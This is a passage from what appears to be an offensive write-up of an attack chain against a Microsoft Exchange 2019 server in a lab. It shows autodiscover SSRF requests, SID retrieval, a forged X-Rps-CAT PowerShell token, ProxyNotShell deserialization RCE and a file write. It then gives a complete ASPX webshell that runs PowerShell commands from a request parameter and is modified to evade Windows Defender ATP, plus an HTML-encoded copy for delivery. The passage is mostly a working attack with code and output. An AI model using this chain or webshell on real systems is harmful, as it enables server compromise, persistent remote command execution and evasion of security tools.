<?xml version="1.0" encoding="utf-8"?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/"><s:Header><h:ServerVersionInfo MajorVersion="15" MinorVersion="2" MajorBuildNumber="721" MinorBuildNumber="2" Version="V2017_07_11" xmlns:h="http://schemas.microsoft.com/exchange/services/2006/types" xmlns="http://schemas.microsoft.com/exchange/services/2006/types" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"/></s:Header><s:Body xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><m:ResolveNamesResponse xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"><m:ResponseMessages><m:ResolveNamesResponseMessage ResponseClass="Success"><m:ResponseCode>NoError</m:ResponseCode><m:ResolutionSet TotalItemsInView="4" IncludesLastItemInRange="true"><t:Resolution><t:Mailbox><t:Name>beizhuan</t:Name><t:EmailAddress>beizhuan@exchange.lab</t:EmailAddress><t:RoutingType>SMTP</t:RoutingType><t:MailboxType>Mailbox</t:MailboxType></t:Mailbox><t:Contact><t:DisplayName>beizhuan</t:DisplayName><t:GivenName/><t:Initials/><t:CompanyName/><t:EmailAddresses><t:Entry Key="EmailAddress1">SMTP:beizhuan@exchange.lab</t:Entry></t:EmailAddresses><t:PhysicalAddresses><t:Entry Key="Business"><t:Street/><t:City/><t:State/><t:CountryOrRegion/><t:PostalCode/></t:Entry></t:PhysicalAddresses><t:PhoneNumbers><t:Entry Key="AssistantPhone"/><t:Entry Key="BusinessFax"/><t:Entry Key="BusinessPhone"/><t:Entry Key="HomePhone"/><t:Entry Key="MobilePhone"/><t:Entry Key="Pager"/></t:PhoneNumbers><t:AssistantName/><t:ContactSource>ActiveDirectory</t:ContactSource><t:Department/><t:JobTitle/><t:OfficeLocation/><t:Surname/></t:Contact></t:Resolution><t:Resolution><t:Mailbox><t:Name>dashe</t:Name><t:EmailAddress>dashe@exchange.lab</t:EmailAddress><t:RoutingType>SMTP</t:RoutingType><t:MailboxType>Mailbox</t:MailboxType></t:Mailbox><t:Contact><t:DisplayName>dashe</t:DisplayName><t:GivenName/><t:Initials/><t:CompanyName/><t:EmailAddresses><t:Entry Key="EmailAddress1">SMTP:dashe@exchange.lab</t:Entry></t:EmailAddresses><t:PhysicalAddresses><t:Entry Key="Business"><t:Street/><t:City/><t:State/><t:CountryOrRegion/><t:PostalCode/></t:Entry></t:PhysicalAddresses><t:PhoneNumbers><t:Entry Key="AssistantPhone"/><t:Entry Key="BusinessFax"/><t:Entry Key="BusinessPhone"/><t:Entry Key="HomePhone"/><t:Entry Key="MobilePhone"/><t:Entry Key="Pager"/></t:PhoneNumbers><t:AssistantName/><t:ContactSource>ActiveDirectory</t:ContactSource><t:Department/><t:JobTitle/><t:OfficeLocation/><t:Surname/></t:Contact></t:Resolution><t:Resolution><t:Mailbox><t:Name>weizi</t:Name><t:EmailAddress>weizi@exchange.lab</t:EmailAddress><t:RoutingType>SMTP</t:RoutingType><t:MailboxType>Mailbox</t:MailboxType></t:Mailbox><t:Contact><t:DisplayName>weizi</t:DisplayName><t:GivenName/><t:Initials/><t:CompanyName/><t:EmailAddresses><t:Entry Key="EmailAddress1">SMTP:weizi@exchange.lab</t:Entry></t:EmailAddresses><t:PhysicalAddresses><t:Entry Key="Business"><t:Street/><t:City/><t:State/><t:CountryOrRegion/><t:PostalCode/></t:Entry></t:PhysicalAddresses><t:PhoneNumbers><t:Entry Key="AssistantPhone"/><t:Entry Key="BusinessFax"/><t:Entry Key="BusinessPhone"/><t:Entry Key="HomePhone"/><t:Entry Key="MobilePhone"/><t:Entry Key="Pager"/></t:PhoneNumbers><t:AssistantName/><t:ContactSource>ActiveDirectory</t:ContactSource><t:Department/><t:JobTitle/><t:OfficeLocation/><t:Surname/></t:Contact></t:Resolution><t:Resolution><t:Mailbox><t:Name>yeshen</t:Name><t:EmailAddress>yeshen@exchange.lab</t:EmailAddress><t:RoutingType>SMTP</t:RoutingType><t:MailboxType>Mailbox</t:MailboxType></t:Mailbox><t:Contact><t:DisplayName>yeshen</t:DisplayName><t:GivenName/><t:Initials/><t:CompanyName/><t:EmailAddresses><t:Entry Key="EmailAddress1">SMTP:yeshen@exchange.lab</t:Entry></t:EmailAddresses><t:PhysicalAddresses><t:Entry Key="Business"><t:Street/><t:City/><t:State/><t:CountryOrRegion/><t:PostalCode/></t:Entry></t:PhysicalAddresses><t:PhoneNumbers><t:Entry Key="AssistantPhone"/><t:Entry Key="BusinessFax"/><t:Entry Key="BusinessPhone"/><t:Entry Key="HomePhone"/><t:Entry Key="MobilePhone"/><t:Entry Key="Pager"/></t:PhoneNumbers><t:AssistantName/><t:ContactSource>ActiveDirectory</t:ContactSource><t:Department/><t:JobTitle/><t:OfficeLocation/><t:Surname/></t:Contact></t:Resolution></m:ResolutionSet></m:ResolveNamesResponseMessage></m:ResponseMessages></m:ResolveNamesResponse></s:Body></s:Envelope>
```

The exchange version information is also found in this response packet, [Exchange Server build numbers and release dates](https://learn.microsoft.com/en-us/exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019)

``` bash
===> ServerVersionInfo MajorVersion="15" MinorVersion="2" MajorBuildNumber="721" MinorBuildNumber="2" Version="V2017_07_11"
===> 15.2.721.2
===> Exchange Server 2019 CU7	September 15, 2020	15.2.721.2	15.02.0721.002
```

Get the dn through the mailbox:

``` bash
POST /autodiscover/autodiscover.json?a=ictbv@pshke.pov/autodiscover/autodiscover.xml HTTP/1.1
Host: 10.0.102.210
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Cookie: Email=autodiscover/autodiscover.json?a=ictbv@pshke.pov
Content-Type: text/xml
Content-Length: 354

<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
					<Request>
					  <EMailAddress>beizhuan@exchange.lab</EMailAddress>
					  <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
					</Request>
				</Autodiscover>
```

``` bash
HTTP/1.1 200 OK
Cache-Control: private
Content-Type: text/xml; charset=utf-8
Vary: Accept-Encoding
Server: Microsoft-IIS/10.0
request-id: 86edc523-c146-4c29-a133-0306b2036eb2
X-CalculatedBETarget: exchange2016.exchange.lab
X-DiagInfo: EXCHANGE2016
X-BEServer: EXCHANGE2016
X-AspNet-Version: 4.0.30319
Set-Cookie: X-BackEndCookie=; expires=Sat, 18-Sep-1993 08:11:28 GMT; path=/autodiscover; secure; HttpOnly
X-Powered-By: ASP.NET
X-FEServer: EXCHANGE2016
Date: Mon, 18 Sep 2023 08:11:28 GMT
Connection: close
Content-Length: 3823

<?xml version="1.0" encoding="utf-8"?>
<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/responseschema/2006">
  <Response xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a">
    <User>
      <DisplayName>beizhuan</DisplayName>
      <LegacyDN>/o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Recipients/cn=d0e52d16ed3b48c1902e2a527e8aad4f-beizh</LegacyDN>
      <AutoDiscoverSMTPAddress>beizhuan@exchange.lab</AutoDiscoverSMTPAddress>
      <DeploymentId>c01270f4-b14e-4b5c-80ca-5bf9bcf624e2</DeploymentId>
    </User>
    <Account>
      <AccountType>email</AccountType>
      <Action>settings</Action>
      <MicrosoftOnline>False</MicrosoftOnline>
      <Protocol>
        <Type>EXCH</Type>
        <Server>9662229a-96fd-45ec-af46-c8e8503ef227@exchange.lab</Server>
        <ServerDN>/o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=9662229a-96fd-45ec-af46-c8e8503ef227@exchange.lab</ServerDN>
        <ServerVersion>73C282D1</ServerVersion>
        <MdbDN>/o=First Organization/ou=Exchange Administrative Group (FYDIBOHF23SPDLT)/cn=Configuration/cn=Servers/cn=9662229a-96fd-45ec-af46-c8e8503ef227@exchange.lab/cn=Microsoft Private MDB</MdbDN>
        <PublicFolderServer>exchange2016.exchange.lab</PublicFolderServer>
        <AD>dc.exchange.lab</AD>
        <ASUrl>https://exchange2016.exchange.lab/EWS/Exchange.asmx</ASUrl>
        <EwsUrl>https://exchange2016.exchange.lab/EWS/Exchange.asmx</EwsUrl>
        <EmwsUrl>https://exchange2016.exchange.lab/EWS/Exchange.asmx</EmwsUrl>
        <EcpUrl>https://exchange2016.exchange.lab/owa/</EcpUrl>
        <EcpUrl-um>?path=/options/callanswering</EcpUrl-um>
        <EcpUrl-aggr>?path=/options/connectedaccounts</EcpUrl-aggr>
        <EcpUrl-mt>options/ecp/PersonalSettings/DeliveryReport.aspx?rfr=olk&amp;exsvurl=1&amp;IsOWA=&lt;IsOWA&gt;&amp;MsgID=&lt;MsgID&gt;&amp;Mbx=&lt;Mbx&gt;</EcpUrl-mt>
        <EcpUrl-ret>?path=/options/retentionpolicies</EcpUrl-ret>
        <EcpUrl-sms>?path=/options/textmessaging</EcpUrl-sms>
        <EcpUrl-photo>?path=/options/myaccount/action/photo</EcpUrl-photo>
        <EcpUrl-tm>options/ecp/?rfr=olk&amp;ftr=TeamMailbox&amp;exsvurl=1</EcpUrl-tm>
        <EcpUrl-tmCreating>options/ecp/?rfr=olk&amp;ftr=TeamMailboxCreating&amp;SPUrl=&lt;SPUrl&gt;&amp;Title=&lt;Title&gt;&amp;SPTMAppUrl=&lt;SPTMAppUrl&gt;&amp;exsvurl=1</EcpUrl-tmCreating>
        <EcpUrl-tmEditing>options/ecp/?rfr=olk&amp;ftr=TeamMailboxEditing&amp;Id=&lt;Id&gt;&amp;exsvurl=1</EcpUrl-tmEditing>
        <EcpUrl-extinstall>?path=/options/manageapps</EcpUrl-extinstall>
        <OOFUrl>https://exchange2016.exchange.lab/EWS/Exchange.asmx</OOFUrl>
        <UMUrl>https://exchange2016.exchange.lab/EWS/UM2007Legacy.asmx</UMUrl>
        <OABUrl>https://exchange2016.exchange.lab/OAB/5356a7f1-86d2-4ad6-868d-623c9fad6d08/</OABUrl>
        <ServerExclusiveConnect>off</ServerExclusiveConnect>
      </Protocol>
      <Protocol>
        <Type>EXPR</Type>
        <Server>exchange2016.exchange.lab</Server>
        <SSL>Off</SSL>
        <AuthPackage>Ntlm</AuthPackage>
        <ServerExclusiveConnect>on</ServerExclusiveConnect>
        <CertPrincipalName>None</CertPrincipalName>
        <GroupingInformation>Default-First-Site-Name</GroupingInformation>
      </Protocol>
      <Protocol>
        <Type>WEB</Type>
        <Internal>
          <OWAUrl AuthenticationMethod="Basic, Fba">https://exchange2016.exchange.lab/owa/</OWAUrl>
          <Protocol>
            <Type>EXCH</Type>
            <ASUrl>https://exchange2016.exchange.lab/EWS/Exchange.asmx</ASUrl>
          </Protocol>
        </Internal>
      </Protocol>
    </Account>
  </Response>
</Autodiscover>
```

4. Getting the sid

This mapi interface has been exploited ever since CVE-2018-8581; when you have an account's dn you can get the sid:

- [self-written script getsid.py](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/proxymaybeshell/ProxyMaybeShell-main/getsid.py)

``` bash
(base) D:\1.recent-research\exchange\proxy-attackchain\proxymaybeshell\ProxyMaybeShell-main>python getsid.py
[+] SID:  S-1-5-21-3005828558-642831567-1133831210-500
```

5. Forging the X-Rps-CAT token parameter of the powershell interface

The powershell interface decides the user identity based on the X-Rps-CAT parameter, mainly judging the identity by the sid it contains:

- [proxyshellwithsid.py](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/proxymaybeshell/ProxyMaybeShell-main/proxyshellwithsid.py)

``` bash
(base) D:\1.recent-research\exchange\proxy-attackchain\proxymaybeshell\ProxyMaybeShell-main>python proxyshellwithsid.py -u https://10.0.102.210 -s S-1-5-21-3005828558-642831567-1133831210-500
Token: VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBBhYWFAZXhjaGFuZ2UubGFiVSxTLTEtNS0yMS0zMDA1ODI4NTU4LTY0MjgzMTU2Ny0xMTMzODMxMjEwLTUwMEcBAAAABwAAAAxTLTEtNS0zMi01NDRFAAAAAA==
```

6. Enumerating sids

The Administrator user turns out to have very low privileges:

``` bash
(base) D:\1.recent-research\exchange\proxy-attackchain\proxymaybeshell\ProxyMaybeShell-main>python proxyshellwithsid.py -u https://10.0.102.210 -s S-1-5-21-3005828558-642831567-1133831210-500
Token: VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBBhYWFAZXhjaGFuZ2UubGFiVSxTLTEtNS0yMS0zMDA1ODI4NTU4LTY0MjgzMTU2Ny0xMTMzODMxMjEwLTUwMEcBAAAABwAAAAxTLTEtNS0zMi01NDRFAAAAAA==
PS> get-command127.0.0.1 - - [18/Sep/2023 14:59:06] "POST /wsman HTTP/1.1" 200 -
127.0.0.1 - - [18/Sep/2023 14:59:07] "POST /wsman HTTP/1.1" 200 -127.0.0.1 - - [18/Sep/2023 14:59:07] "POST /wsman HTTP/1.1" 200 -
127.0.0.1 - - [18/Sep/2023 14:59:08] "POST /wsman HTTP/1.1" 200 -
127.0.0.1 - - [18/Sep/2023 14:59:08] "POST /wsman HTTP/1.1" 200 -
127.0.0.1 - - [18/Sep/2023 14:59:09] "POST /wsman HTTP/1.1" 200 -
127.0.0.1 - - [18/Sep/2023 14:59:10] "POST /wsman HTTP/1.1" 200 -
127.0.0.1 - - [18/Sep/2023 14:59:10] "POST /wsman HTTP/1.1" 200 -
OUTPUT:
Get-Command
Get-Help
Get-Mailbox
Get-MailboxExportRequest
Get-MailboxExportRequestStatistics
Get-MailboxImportRequest
Get-MailboxImportRequestStatistics
Get-Notification
Get-RecoverableItems
Get-UnifiedAuditSetting
New-MailboxExportRequest
New-MailboxImportRequest
Remove-MailboxExportRequest
Remove-MailboxImportRequest
Restore-RecoverableItems
Resume-MailboxExportRequest
Resume-MailboxImportRequest
Search-Mailbox
Set-ADServerSettings
Set-MailboxExportRequest
Set-MailboxImportRequest
Set-Notification
Set-UnifiedAuditSetting
Start-AuditAssistant
Suspend-MailboxExportRequest
Suspend-MailboxImportRequest
Write-AdminAuditLog
Exit-PSSession
Get-FormatData
Measure-Object
Out-Default
Select-Object
```

You can enumerate sids until you find an account that supports New-MailboxExportRequest, but in this environment a series of attempts came to nothing. None of the accounts obtained with getmailbox had high privileges either:

``` bash
PS> get-mailbox
127.0.0.1 - - [18/Sep/2023 15:00:12] "POST /wsman HTTP/1.1" 200 -
127.0.0.1 - - [18/Sep/2023 15:00:12] "POST /wsman HTTP/1.1" 200 -
127.0.0.1 - - [18/Sep/2023 15:00:13] "POST /wsman HTTP/1.1" 200 -
127.0.0.1 - - [18/Sep/2023 15:00:13] "POST /wsman HTTP/1.1" 200 -
127.0.0.1 - - [18/Sep/2023 15:00:15] "POST /wsman HTTP/1.1" 200 -
127.0.0.1 - - [18/Sep/2023 15:00:16] "POST /wsman HTTP/1.1" 200 -
OUTPUT:
发现搜索邮箱
BitsAdmin
weizi
dashe
beizhuan
yeshen
```

7. SSRF2RCE

proxyshell can no longer be exploited. But the ssrf that exists can still be used

From the earlier response packet, this exchange version is 15.2.721.2, which is fairly old and is not affected by vulnerabilities such as CVE-2021–42321 and CVE-2022-23277. By comparison the newer ProxyNotShell vulnerability has a somewhat wider range of affected versions

The original script authenticates with NTLM using the account and password directly and then attacks through the deserialization vulnerability. Here it has to be changed into the form that uses the ssrf vulnerability together with X-Rps-CAT to bypass authentication

The X-Rps-CAT can be obtained with the [proxyshellwithsid.py](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/proxymaybeshell/ProxyMaybeShell-main/proxyshellwithsid.py) script

``` bash
(base) D:\1.recent-research\exchange\proxy-attackchain\proxymaybeshell\ProxyMaybeShell-main>python proxyshellwithsid.py -u https://10.0.102.210 -s S-1-5-21-3005828558-642831567-1133831210-500
Token: VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBBhYWFAZXhjaGFuZ2UubGFiVSxTLTEtNS0yMS0zMDA1ODI4NTU4LTY0MjgzMTU2Ny0xMTMzODMxMjEwLTUwMEcBAAAABwAAAAxTLTEtNS0zMi01NDRFAAAAAA==
```

9. ReSSRF

After filling it into the [proxynotshellcmd.py](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/proxymaybeshell/ProxyMaybeShell-main/proxynotshellcmd.py) script, rce is performed, and here we hit the classic problem of command execution with no output. The target has no outbound network access, including dns. Only writing files is possible, but in this environment the usual exchange directories where a webshell is placed, such as owa/ecp/aspnet_client, cannot be reached. Directories such as autodiscover can be reached but need credentials. Connecting this with what came before, it is easy to think of bypassing autodiscover's authentication through ssrf, so a simple probe script is written:

- [ssrf-Autodiscover.py](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/proxymaybeshell/ProxyMaybeShell-main/ssrf-Autodiscover.py)

After many attempts the write still would not succeed. Several possible problems were tried, including escaping of the command, and the conclusion was that it was probably blocked by the target's antivirus.

10. Writing a file through proxynotshell deserialization exploitation

After modifying the poc, the write is accessed with [proxynotshellfileWrite.py](https://github.com/FDlucifer/Proxy-Attackchain/blob/12e3c7f8bcbf9dba3a3df1866070f72d6eda51b1/proxymaybeshell/ProxyMaybeShell-main/proxynotshellfileWrite.py). Writing the earlier plain aspx one-line shell from proxyshell succeeds but reports a compilation error

11. bypass windows definder ATP

Looking at the directory shows that a fairly new windows definder atp is present. Using [POWERshell.aspx](https://github.com/ThePacketBender/webshells/blob/master/POWERshell.aspx), some of Defender's restrictions can be bypassed by calling the c# powershell related dll. In this exploitation situation a webshell with control forms is very awkward to use, so the webshell is modified slightly:

``` bash
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Collections.ObjectModel"%>
<%@ Import Namespace="System.Management.Automation"%>
<%@ Import Namespace="System.Management.Automation.Runspaces"%>
<%@ Assembly Name="System.Management.Automation,Version=1.0.0.0,Culture=neutral,PublicKeyToken=31BF3856AD364E35"%>
<!DOCTYPE html>
<script Language="c#" runat="server">
    private static string powershelled(string scriptText)
    {
        try
        {
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            Pipeline pipeline = runspace.CreatePipeline();
            pipeline.Commands.AddScript(scriptText);
            pipeline.Commands.Add("Out-String");
            Collection<PSObject> results = pipeline.Invoke();
            runspace.Close();
            StringBuilder stringBuilder = new StringBuilder();
            foreach (PSObject obj in results)
                stringBuilder.AppendLine(obj.ToString());
            return stringBuilder.ToString();
        }catch(Exception exception)
        {
            return string.Format("Error: {0}", exception.Message);
        }
    }
    protected void Page_Load(object sender, EventArgs e)
    {
       Response.Write(powershelled(Request.Params["cmd"]));
    }
</script>
```

Escape it into html encoding:

``` bash
&#x3c;&#x25;&#x40;&#x20;&#x50;&#x61;&#x67;&#x65;&#x20;&#x4c;&#x61;&#x6e;&#x67;&#x75;&#x61;&#x67;&#x65;&#x3d;&#x22;&#x43;&#x23;&#x22;&#x20;&#x25;&#x3e;&#x0a;&#x3c;&#x25;&#x40;&#x20;&#x49;&#x6d;&#x70;&#x6f;&#x72;&#x74;&#x20;&#x4e;&#x61;&#x6d;&#x65;&#x73;&#x70;&#x61;&#x63;&#x65;&#x3d;&#x22;&#x53;&#x79;&#x73;&#x74;&#x65;&#x6d;&#x2e;&#x43;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x73;&#x2e;&#x4f;&#x62;&#x6a;&#x65;&#x63;&#x74;&#x4d;&#x6f;&#x64;&#x65;&#x6c;&#x22;&#x25;&#x3e;&#x0a;&#x3c;&#x25;&#x40;&#x20;&#x49;&#x6d;&#x70;&#x6f;&#x72;&#x74;&#x20;&#x4e;&#x61;&#x6d;&#x65;&#x73;&#x70;&#x61;&#x63;&#x65;&#x3d;&#x22;&#x53;&#x79;&#x73;&#x74;&#x65;&#x6d;&#x2e;&#x4d;&#x61;&#x6e;&#x61;&#x67;&#x65;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x41;&#x75;&#x74;&#x6f;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x22;&#x25;&#x3e;&#x0a;&#x3c;&#x25;&#x40;&#x20;&#x49;&#x6d;&#x70;&#x6f;&#x72;&#x74;&#x20;&#x4e;&#x61;&#x6d;&#x65;&#x73;&#x70;&#x61;&#x63;&#x65;&#x3d;&#x22;&#x53;&#x79;&#x73;&#x74;&#x65;&#x6d;&#x2e;&#x4d;&#x61;&#x6e;&#x61;&#x67;&#x65;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x41;&#x75;&#x74;&#x6f;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x2e;&#x52;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x73;&#x22;&#x25;&#x3e;&#x0a;&#x3c;&#x25;&#x40;&#x20;&#x41;&#x73;&#x73;&#x65;&#x6d;&#x62;&#x6c;&#x79;&#x20;&#x4e;&#x61;&#x6d;&#x65;&#x3d;&#x22;&#x53;&#x79;&#x73;&#x74;&#x65;&#x6d;&#x2e;&#x4d;&#x61;&#x6e;&#x61;&#x67;&#x65;&#x6d;&#x65;&#x6e;&#x74;&#x2e;&#x41;&#x75;&#x74;&#x6f;&#x6d;&#x61;&#x74;&#x69;&#x6f;&#x6e;&#x2c;&#x56;&#x65;&#x72;&#x73;&#x69;&#x6f;&#x6e;&#x3d;&#x31;&#x2e;&#x30;&#x2e;&#x30;&#x2e;&#x30;&#x2c;&#x43;&#x75;&#x6c;&#x74;&#x75;&#x72;&#x65;&#x3d;&#x6e;&#x65;&#x75;&#x74;&#x72;&#x61;&#x6c;&#x2c;&#x50;&#x75;&#x62;&#x6c;&#x69;&#x63;&#x4b;&#x65;&#x79;&#x54;&#x6f;&#x6b;&#x65;&#x6e;&#x3d;&#x33;&#x31;&#x42;&#x46;&#x33;&#x38;&#x35;&#x36;&#x41;&#x44;&#x33;&#x36;&#x34;&#x45;&#x33;&#x35;&#x22;&#x25;&#x3e;&#x0a;&#x3c;&#x21;&#x44;&#x4f;&#x43;&#x54;&#x59;&#x50;&#x45;&#x20;&#x68;&#x74;&#x6d;&#x6c;&#x3e;&#x0a;&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x20;&#x4c;&#x61;&#x6e;&#x67;&#x75;&#x61;&#x67;&#x65;&#x3d;&#x22;&#x63;&#x23;&#x22;&#x20;&#x72;&#x75;&#x6e;&#x61;&#x74;&#x3d;&#x22;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x22;&#x3e;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x70;&#x72;&#x69;&#x76;&#x61;&#x74;&#x65;&#x20;&#x73;&#x74;&#x61;&#x74;&#x69;&#x63;&#x20;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x20;&#x70;&#x6f;&#x77;&#x65;&#x72;&#x73;&#x68;&#x65;&#x6c;&#x6c;&#x65;&#x64;&#x28;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x20;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x54;&#x65;&#x78;&#x74;&#x29;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x74;&#x72;&#x79;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x7b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x52;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x20;&#x72;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x20;&#x3d;&#x20;&#x52;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x46;&#x61;&#x63;&#x74;&#x6f;&#x72;&#x79;&#x2e;&#x43;&#x72;&#x65;&#x61;&#x74;&#x65;&#x52;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x72;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x2e;&#x4f;&#x70;&#x65;&#x6e;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x50;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x20;&#x70;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x20;&#x3d;&#x20;&#x72;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x2e;&#x43;&#x72;&#x65;&#x61;&#x74;&#x65;&#x50;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x70;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x2e;&#x43;&#x6f;&#x6d;&#x6d;&#x61;&#x6e;&#x64;&#x73;&#x2e;&#x41;&#x64;&#x64;&#x53;&#x63;&#x72;&#x69;&#x70;&#x74;&#x28;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x54;&#x65;&#x78;&#x74;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x70;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x2e;&#x43;&#x6f;&#x6d;&#x6d;&#x61;&#x6e;&#x64;&#x73;&#x2e;&#x41;&#x64;&#x64;&#x28;&#x22;&#x4f;&#x75;&#x74;&#x2d;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x22;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x43;&#x6f;&#x6c;&#x6c;&#x65;&#x63;&#x74;&#x69;&#x6f;&#x6e;&#x3c;&#x50;&#x53;&#x4f;&#x62;&#x6a;&#x65;&#x63;&#x74;&#x3e;&#x20;&#x72;&#x65;&#x73;&#x75;&#x6c;&#x74;&#x73;&#x20;&#x3d;&#x20;&#x70;&#x69;&#x70;&#x65;&#x6c;&#x69;&#x6e;&#x65;&#x2e;&#x49;&#x6e;&#x76;&#x6f;&#x6b;&#x65;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x72;&#x75;&#x6e;&#x73;&#x70;&#x61;&#x63;&#x65;&#x2e;&#x43;&#x6c;&#x6f;&#x73;&#x65;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x42;&#x75;&#x69;&#x6c;&#x64;&#x65;&#x72;&#x20;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x42;&#x75;&#x69;&#x6c;&#x64;&#x65;&#x72;&#x20;&#x3d;&#x20;&#x6e;&#x65;&#x77;&#x20;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x42;&#x75;&#x69;&#x6c;&#x64;&#x65;&#x72;&#x28;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x66;&#x6f;&#x72;&#x65;&#x61;&#x63;&#x68;&#x20;&#x28;&#x50;&#x53;&#x4f;&#x62;&#x6a;&#x65;&#x63;&#x74;&#x20;&#x6f;&#x62;&#x6a;&#x20;&#x69;&#x6e;&#x20;&#x72;&#x65;&#x73;&#x75;&#x6c;&#x74;&#x73;&#x29;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x42;&#x75;&#x69;&#x6c;&#x64;&#x65;&#x72;&#x2e;&#x41;&#x70;&#x70;&#x65;&#x6e;&#x64;&#x4c;&#x69;&#x6e;&#x65;&#x28;&#x6f;&#x62;&#x6a;&#x2e;&#x54;&#x6f;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x29;&#x29;&#x3b;&#x0a;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x20;&#x72;&#x65;&#x74;&#x75;&#x72;&#x6e;&#x20;&#x73;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x42;&#x75;&#x69;&#x6c;&#x64;&#x65;&#x72;&#x2e;&#x54;&#x6f;&#x53;&#x74;&#x72;&#x69;&#x6e;&#x67;&#x28;&#x29;&#x3b;&#x0a;&#x